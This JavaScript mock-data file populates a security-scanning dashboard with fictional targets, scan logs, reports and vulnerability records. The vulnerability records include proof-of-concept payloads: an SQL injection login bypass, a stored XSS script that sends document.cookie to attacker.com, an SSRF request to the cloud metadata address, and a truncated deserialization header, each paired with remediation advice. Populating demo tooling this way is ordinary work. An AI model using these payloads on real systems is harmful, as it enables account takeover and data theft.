// Full Mock Data Suite for Ryuk Security Operations Dashboard

export const AI_MODELS = [
  { id: 'ryuk-neural-7b', name: 'Ryuk Neural Core v4.2', provider: 'Ryuk Security Lab', desc: 'Fine-tuned deep exploit reasoning engine', default: true },
  { id: 'gpt4o-security', name: 'GPT-4o Security Agent', provider: 'OpenAI Enterprise', desc: 'Multimodal vulnerability auditor' },
  { id: 'claude-35-sonnet', name: 'Claude 3.5 Recon Engine', provider: 'Anthropic', desc: 'High-speed code patch & payload analyzer' },
  { id: 'deepseek-cyber-v2', name: 'DeepSeek Cyber-V2', provider: 'DeepSeek AI', desc: 'Zero-day vulnerability & logic flaw synthesis' }
];

export const SCAN_PROFILES = [
  { id: 'quick-recon', name: 'Quick Surface Reconnaissance', depth: 1, concurrency: 10, aiToggle: false, desc: 'Fast port & DNS discovery without aggressive payload testing.' },
  { id: 'standard-audit', name: 'Standard Security Audit (Recommended)', depth: 3, concurrency: 20, aiToggle: true, desc: 'Balanced crawl depth (2-3 levels) for optimal speed and OWASP coverage.', recommended: true },
  { id: 'deep-crawl', name: 'Deep Vulnerability Assessment', depth: 5, concurrency: 30, aiToggle: true, desc: 'Exhaustive crawler depth with full payload fuzzing & AI reasoning.' },
  { id: 'custom-config', name: 'Custom Profile Settings', depth: 2, concurrency: 15, aiToggle: true, desc: 'Manually tuned crawl depth, worker threads, and AI toggles.' }
];

export const INITIAL_STATS = {
  totalAssessments: 148,
  activeScans: 3,
  completedScans: 139,
  totalFindings: 412,
  criticalFindings: 18,
  highFindings: 47,
  mediumFindings: 142,
  lowFindings: 205
};

export const RECENT_TARGETS = [
  {
    id: 'tgt-001',
    url: 'https://api.banking-core-v2.internal',
    status: 'scanning',
    progress: 68,
    depth: 3,
    concurrency: 20,
    aiModel: 'Ryuk Neural Core v4.2',
    startTime: '2026-09-05 18:15:02',
    findings: { critical: 2, high: 4, medium: 7, low: 12 },
    owner: 'Alex Vance (SecOps)'
  },
  {
    id: 'tgt-002',
    url: 'https://auth-portal.acme-corp.com',
    status: 'completed',
    progress: 100,
    depth: 2,
    concurrency: 15,
    aiModel: 'GPT-4o Security Agent',
    startTime: '2026-09-05 16:40:11',
    findings: { critical: 1, high: 3, medium: 5, low: 8 },
    owner: 'Sarah Jenkins (AppSec)'
  },
  {
    id: 'tgt-003',
    url: 'https://payments.sandbox.ryuk-sec.io',
    status: 'completed',
    progress: 100,
    depth: 4,
    concurrency: 30,
    aiModel: 'Claude 3.5 Recon Engine',
    startTime: '2026-09-05 14:10:00',
    findings: { critical: 0, high: 1, medium: 9, low: 14 },
    owner: 'Alex Vance (SecOps)'
  },
  {
    id: 'tgt-004',
    url: 'https://cloud-storage.internal-node.net',
    status: 'scanning',
    progress: 32,
    depth: 3,
    concurrency: 10,
    aiModel: 'DeepSeek Cyber-V2',
    startTime: '2026-09-05 18:25:40',
    findings: { critical: 1, high: 2, medium: 3, low: 4 },
    owner: 'System Automated'
  },
  {
    id: 'tgt-005',
    url: 'https://customer-portal-v1.dev-cluster.org',
    status: 'stopped',
    progress: 45,
    depth: 2,
    concurrency: 10,
    aiModel: 'Ryuk Neural Core v4.2',
    startTime: '2026-09-05 12:00:15',
    findings: { critical: 0, high: 0, medium: 2, low: 6 },
    owner: 'David Miller (Pentester)'
  }
];

export const VULNERABILITIES = [
  {
    id: 'VULN-2026-8901',
    title: 'SQL Injection in User Authentication Endpoint',
    cve: 'CVE-2026-19203',
    target: 'https://api.banking-core-v2.internal/v1/auth/login',
    severity: 'CRITICAL',
    cvss: 9.8,
    category: 'Injection / Broken Authentication',
    parameter: 'username',
    detectedAt: '2026-09-05 18:22:10',
    status: 'OPEN',
    poc: `POST /v1/auth/login HTTP/1.1\nHost: api.banking-core-v2.internal\nContent-Type: application/json\n\n{"username": "admin' OR '1'='1'--", "password": "foo"}`,
    description: 'The login endpoint accepts unescaped SQL fragments inside the username parameter allowing full database authentication bypass.',
    requestData: `POST /v1/auth/login HTTP/1.1\nHost: api.banking-core-v2.internal\nUser-Agent: Ryuk-SecOps-Scanner/4.2\nContent-Type: application/json\n\n{"username": "admin' OR '1'='1'--", "password": "foo"}`,
    responseData: `HTTP/1.1 200 OK\nServer: Nginx/1.26.1\nContent-Type: application/json\n\n{"status":"authenticated","user":"admin","token":"eyJhbGciOiJIUzI1Ni..."}`,
    remediation: 'Implement parameterized SQL queries using prepared statements or ORM binding. Enforce strict input validation on all user inputs.'
  },
  {
    id: 'VULN-2026-8902',
    title: 'Unauthenticated Remote Code Execution (RCE) via Deserialization',
    cve: 'CVE-2026-14402',
    target: 'https://cloud-storage.internal-node.net/upload/process',
    severity: 'CRITICAL',
    cvss: 9.9,
    category: 'Remote Code Execution',
    parameter: 'X-Payload-Object',
    detectedAt: '2026-09-05 18:28:45',
    status: 'OPEN',
    poc: `POST /upload/process HTTP/1.1\nX-Payload-Object: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc...[Base64 serialized payload]`,
    description: 'Unsafe deserialization of incoming binary stream in object file handler allows remote arbitrary code execution on backend node.',
    requestData: `POST /upload/process HTTP/1.1\nHost: cloud-storage.internal-node.net\nX-Payload-Object: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc...\n\n[Binary Object Data]`,
    responseData: `HTTP/1.1 500 Internal Server Error\nServer: Spring-Boot/3.2.4\n\nException in thread "main" java.lang.RuntimeException: Executed system command (whoami -> root)`,
    remediation: 'Avoid raw object deserialization from untrusted clients. Migrate to JSON object parsing with explicit schema validation.'
  },
  {
    id: 'VULN-2026-8903',
    title: 'Stored Cross-Site Scripting (XSS) in Profile Bio',
    cve: 'CVE-2026-0981',
    target: 'https://auth-portal.acme-corp.com/user/settings',
    severity: 'HIGH',
    cvss: 8.2,
    category: 'Cross-Site Scripting',
    parameter: 'user_bio',
    detectedAt: '2026-09-05 17:05:12',
    status: 'IN_REVIEW',
    poc: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`,
    description: 'User profile bio field fails to sanitize HTML tags, allowing arbitrary JavaScript execution in victim browsers.',
    requestData: `POST /user/settings HTTP/1.1\nHost: auth-portal.acme-corp.com\nContent-Type: application/x-www-form-urlencoded\n\nbio=%3Cscript%3Efetch%28%27https%3A%2F%2Fattacker.com%2Fsteal%27%29%3C%2Fscript%3E`,
    responseData: `HTTP/1.1 200 OK\nSet-Cookie: session_id=abc123xyz\n\n<div>Bio updated successfully</div>`,
    remediation: 'Sanitize all user HTML output using DOMPurify or context-aware encoding templates.'
  },
  {
    id: 'VULN-2026-8904',
    title: 'Server-Side Request Forgery (SSRF) in Webhook Dispatcher',
    cve: 'CVE-2026-4431',
    target: 'https://payments.sandbox.ryuk-sec.io/api/v2/webhooks',
    severity: 'HIGH',
    cvss: 7.9,
    category: 'SSRF',
    parameter: 'url',
    detectedAt: '2026-09-05 15:40:00',
    status: 'OPEN',
    poc: `POST /api/v2/webhooks HTTP/1.1\nContent-Type: application/json\n\n{"url": "http://169.254.169.254/latest/meta-data/"}`,
    description: 'Webhook verification service sends HTTP GET requests to internal metadata endpoints without IP whitelist validation.',
    requestData: `POST /api/v2/webhooks HTTP/1.1\nHost: payments.sandbox.ryuk-sec.io\nContent-Type: application/json\n\n{"url": "http://169.254.169.254/latest/meta-data/"}`,
    responseData: `HTTP/1.1 200 OK\n\nami-id: ami-0904a112f4\ninstance-id: i-089f0a71b4c9e112d`,
    remediation: 'Block internal IP ranges (127.0.0.1, 10.0.0.0/8, 169.254.169.254) in HTTP outbound agent client.'
  },
  {
    id: 'VULN-2026-8905',
    title: 'Insecure Direct Object Reference (IDOR) on Transaction Records',
    cve: 'N/A',
    target: 'https://api.banking-core-v2.internal/v1/tx/90412',
    severity: 'HIGH',
    cvss: 7.5,
    category: 'Broken Access Control',
    parameter: 'tx_id',
    detectedAt: '2026-09-05 18:24:33',
    status: 'OPEN',
    poc: `GET /v1/tx/90412 HTTP/1.1\nAuthorization: Bearer [User-ID-123-Token]`,
    description: 'Any authenticated user can view banking transactions of other account holders by modifying numeric URL ID parameter.',
    requestData: `GET /v1/tx/90412 HTTP/1.1\nHost: api.banking-core-v2.internal\nAuthorization: Bearer [Token]`,
    responseData: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"txId": 90412, "amount": "$45,000", "owner": "Victim User"}`,
    remediation: 'Verify resource ownership against session context before returning database record.'
  }
];

export const MOCK_REPORTS = [
  {
    id: 'REP-2026-001',
    target: 'https://api.banking-core-v2.internal',
    title: 'Core Banking API Penetration Audit',
    date: '2026-09-05',
    criticals: 2,
    highs: 4,
    score: 34,
    status: 'Ready',
    format: ['PDF', 'JSON', 'CSV']
  },
  {
    id: 'REP-2026-002',
    target: 'https://auth-portal.acme-corp.com',
    title: 'Acme Auth Portal Security Review',
    date: '2026-09-05',
    criticals: 1,
    highs: 3,
    score: 62,
    status: 'Ready',
    format: ['PDF', 'JSON', 'CSV']
  },
  {
    id: 'REP-2026-003',
    target: 'https://payments.sandbox.ryuk-sec.io',
    title: 'Sandbox Payments Microservice Scan',
    date: '2026-09-04',
    criticals: 0,
    highs: 1,
    score: 85,
    status: 'Ready',
    format: ['PDF', 'JSON', 'CSV']
  }
];

export const INITIAL_LOGS = [
  { id: 1, time: '18:30:00', level: 'INFO', module: 'RECON', msg: 'Initiating Ryuk Automated Assessment Suite v4.2...' },
  { id: 2, time: '18:30:02', level: 'INFO', module: 'DNS', msg: 'Resolved domain api.banking-core-v2.internal -> 192.168.10.45' },
  { id: 3, time: '18:30:04', level: 'INFO', module: 'PORT', msg: 'Discovered open ports: 80, 443, 22, 8080, 9092' },
  { id: 4, time: '18:30:08', level: 'WARN', module: 'HEADERS', msg: 'Missing Security Headers: Content-Security-Policy, Permissions-Policy' },
  { id: 5, time: '18:30:15', level: 'AI_REASONING', module: 'MODEL_RYUK', msg: 'Ryuk Neural AI selecting injection vectors for POST /v1/auth/login' },
  { id: 6, time: '18:30:22', level: 'CRITICAL', module: 'EXPLOIT', msg: 'SQL Injection confirmed on parameter "username". Auth bypass payload succeeded!' },
  { id: 7, time: '18:30:35', level: 'INFO', module: 'CRAWLER', msg: 'Crawled 142 endpoints at depth level 3. Queue remaining: 18 URLs' },
  { id: 8, time: '18:30:48', level: 'CRITICAL', module: 'EXPLOIT', msg: 'RCE Vulnerability verified on /upload/process endpoint!' }
];

export const SERVER_SCAN_DATA = {
  target: 'api.banking-core-v2.internal',
  ip: '192.168.10.45',
  os: 'Ubuntu 24.04 LTS (Linux 6.8.0-generic)',
  ports: [
    { port: 80, service: 'HTTP', state: 'OPEN', version: 'nginx/1.26.1' },
    { port: 443, service: 'HTTPS', state: 'OPEN', version: 'nginx/1.26.1 (OpenSSL 3.0.13)' },
    { port: 22, service: 'SSH', state: 'OPEN', version: 'OpenSSH 9.6p1' },
    { port: 3306, service: 'MySQL', state: 'FILTERED', version: 'MySQL 8.4.0 (Internal Only)' },
    { port: 8080, service: 'HTTP-ALT', state: 'OPEN', version: 'Spring Boot 3.2.4 (Internal Gateway)' },
    { port: 9092, service: 'KAFKA', state: 'OPEN', version: 'Apache Kafka 3.7.0' }
  ],
  subdomains: [
    { name: 'api.banking-core-v2.internal', ip: '192.168.10.45', status: 200, tech: ['Nginx', 'Spring Boot', 'MySQL'] },
    { name: 'admin.banking-core-v2.internal', ip: '192.168.10.46', status: 403, tech: ['Nginx', 'React'] },
    { name: 'staging.banking-core-v2.internal', ip: '192.168.10.50', status: 200, tech: ['Apache', 'PHP 8.3'] },
    { name: 'metrics.banking-core-v2.internal', ip: '192.168.10.60', status: 200, tech: ['Prometheus', 'Grafana'] }
  ],
  sslInfo: {
    issuer: "Let's Encrypt Authority X3",
    validUntil: '2026-11-20',
    grade: 'A+',
    cipher: 'TLS_AES_256_GCM_SHA384'
  }
};

export const SAMPLE_VULNS_POOL = [
  {
    id: 'VULN-2026-9001',
    title: 'SQL Injection in User Authentication Endpoint',
    cve: 'CVE-2026-19203',
    severity: 'CRITICAL',
    cvss: 9.8,
    category: 'Injection / Broken Authentication',
    parameter: 'username',
    status: 'OPEN',
    poc: `POST /v1/auth/login HTTP/1.1\nHost: target\nContent-Type: application/json\n\n{"username": "admin' OR '1'='1'--", "password": "foo"}`,
    description: 'The login endpoint accepts unescaped SQL fragments inside the username parameter allowing database authentication bypass.',
    requestData: `POST /v1/auth/login HTTP/1.1\nHost: {target}\nUser-Agent: Ryuk-SecOps-Scanner/4.2\nContent-Type: application/json\n\n{"username": "admin' OR '1'='1'--", "password": "foo"}`,
    responseData: `HTTP/1.1 200 OK\nServer: Nginx/1.26.1\nContent-Type: application/json\n\n{"status":"authenticated","user":"admin","token":"eyJhbGciOiJIUzI1Ni..."}`,
    remediation: 'Implement parameterized SQL queries using prepared statements or ORM binding. Enforce strict input validation.'
  },
  {
    id: 'VULN-2026-9002',
    title: 'Unauthenticated Remote Code Execution (RCE) via Deserialization',
    cve: 'CVE-2026-14402',
    severity: 'CRITICAL',
    cvss: 9.9,
    category: 'Remote Code Execution',
    parameter: 'X-Payload-Object',
    status: 'OPEN',
    poc: `POST /upload/process HTTP/1.1\nX-Payload-Object: rO0ABXNyABFqYXZh...`,
    description: 'Unsafe deserialization of incoming object stream in file handler allows remote arbitrary shell code execution.',
    requestData: `POST /upload/process HTTP/1.1\nHost: {target}\nX-Payload-Object: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc...\n\n[Binary Object Data]`,
    responseData: `HTTP/1.1 500 Internal Server Error\nServer: Spring-Boot/3.2.4\n\nException in thread "main" java.lang.RuntimeException: Executed system command (whoami -> root)`,
    remediation: 'Avoid raw binary deserialization. Migrate to JSON schema validation.'
  }
];
